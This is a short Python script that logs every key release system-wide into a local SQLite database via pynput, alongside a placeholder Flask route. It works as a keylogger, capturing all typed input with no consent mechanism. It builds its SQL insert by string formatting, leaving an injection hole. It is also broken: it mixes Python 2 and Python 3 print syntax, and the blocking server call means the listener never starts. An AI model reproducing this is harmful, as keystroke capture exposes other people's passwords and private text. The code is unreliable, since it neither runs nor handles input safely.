import pynput
import sqlite3
from flask import Flask
app = Flask(__name__)

conn = sqlite3.connect('kbl.db', check_same_thread=False)
c = conn.cursor()

def create_table_if_not_exists():
    c.execute('''CREATE TABLE IF NOT EXISTS KBL_KEY_RELEASE(
        ID INTEGER PRIMARY KEY AUTOINCREMENT,
        KEY_NAME VARCHAR(30) NOT NULL,
        CREATE_DATE TIMESTAMP default (datetime('now', 'localtime'))
        );''')
    conn.commit()

def insert_key_to_db(key):
    sql = "INSERT INTO KBL_KEY_RELEASE(KEY_NAME) VALUES ('{0}')"
    print sql.format(key)
    c.execute(sql.format(key))
    conn.commit()

def on_key_release(key):
    key_string = str(key).replace('\'', '')

    if key_string.startswith('u'):
        key_string = key_string[1:]

    if key_string.startswith('Key'):
        key_string = key_string[4:]

    insert_key_to_db(key_string)
    if key_string == 'f15':
        conn.close()
        return False

@app.route('/')
def index():
    return 'Hello World!'

if __name__ == "__main__":
    create_table_if_not_exists()    
    print("init success...")
    app.run()
    print("server start...")
    with pynput.keyboard.Listener(on_release=on_key_release) as listener:
        listener.join()
    print("key listener start...")
